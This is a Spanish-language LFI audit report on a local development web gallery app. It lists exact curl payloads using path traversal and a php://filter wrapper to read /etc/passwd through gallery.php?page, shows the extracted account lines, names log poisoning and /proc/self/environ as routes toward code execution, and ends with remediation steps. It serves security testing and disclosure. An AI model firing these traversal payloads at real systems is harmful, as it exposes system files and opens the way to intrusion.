# Informe de auditoría LFI - Galería de Arte Virtual

Fecha: 2026-04-27T15:43:42Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
Se realizó un análisis orientado a detectar vulnerabilidades de Local File Inclusion (LFI) en la aplicación web "Galería de Arte Virtual".

Hallazgos principales:
- Parámetro vulnerable: gallery.php?page
- Prueba de lectura de ficheros del sistema: /etc/passwd fue leído con éxito mediante traversal.
- Evidencia: la respuesta de gallery.php?page=../../../../../../etc/passwd contiene el listado de /etc/passwd (entradas como root:x:0:0:..., www-data:x:33:33:...)

Comandos y payloads utilizados (reconstruidos exactamente):
1) Reconocimiento inicial:
   curl -sS -D /tmp/headers.txt -o /tmp/homepage.html 'http://web.dev.local:8081'

2) Fuzzing y pruebas de LFI (ejemplos relevantes):
   - curl -sS 'http://web.dev.local:8081/?page=/etc/passwd'
   - curl -sS 'http://web.dev.local:8081/?page=../../../../../../etc/passwd'
   - curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
   - curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../../../../etc/passwd'
   - curl -sS 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd'

3) Comando automatizado empleado durante el test:
   Se ejecutó un script de bucle (bash) que probó múltiples endpoints (gallery.php, gallery, index.php, /) y múltiples parámetros (page, file, include, template, ...), así como payloads de traversal y php://filter; los resultados se guardaron en /tmp/lfi_gallery_scan.txt. Las líneas relevantes mostraron coincidencias para gallery.php?page=../../../../../../etc/passwd y variantes.

Evidencias extraídas (fragmento relevante):
- Respuesta que incluye extracto de /etc/passwd:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Impacto:
- La aplicación permite inclusión de ficheros locales (LFI) al construir rutas internas de páginas (p.ej. pages/<valor>.php) sin sanitización adecuada.
- Lectura de archivos sensibles: se confirmó lectura de /etc/passwd (información de cuentas), lo que permite enumerar usuarios del sistema y facilita pasos posteriores de explotación (e.g., localizar usuarios con permisos o servicios a atacar).
- Potencial escalada: usando php://filter para leer archivos PHP de la aplicación y base64-decode, es posible extraer código fuente y credenciales si estuvieran presentes en ficheros de configuración; además técnicas de log poisoning o lectura de /proc/self/environ pueden llevar a RCE en ciertos contextos.

Pruebas de explotación adicionales intentadas:
- php://filter para base64-encode de /etc/passwd y de ficheros de la app (se incluyó en los payloads automatizados). (No fue necesario para leer /etc/passwd, traversal directo funcionó).
- Se intentaron rutas hacia /var/www/html/.env y configs, sin éxito en esta iteración (no bajas adicionales encontradas en la salida guardada).

Recomendaciones:
1) Validar y normalizar el parámetro "page" en el servidor: permitir sólo valores predefinidos (whitelist) o mapear nombres de página a rutas fijas del servidor.
2) Evitar incluir archivos directo desde entrada del usuario. Utilizar un switch/array que resuelva páginas permitidas.
3) Deshabilitar wrappers inseguros y revisar la configuración de PHP (open_basedir, allow_url_include = Off).
4) Revisar logs, rotación y permisos de ficheros; minimizar la información expuesta en errores.

Archivos con evidencia local:
- /tmp/lfi_gallery_scan.txt  (contenido completo del fuzzing ejecutado durante la prueba)

Conclusión:
La aplicación es vulnerable a LFI a través de gallery.php?page y permitió la lectura de /etc/passwd, confirmando la vulnerabilidad y su explotación a nivel de lectura de sistema.


-- Auditor: Laboratorio de Seguridad
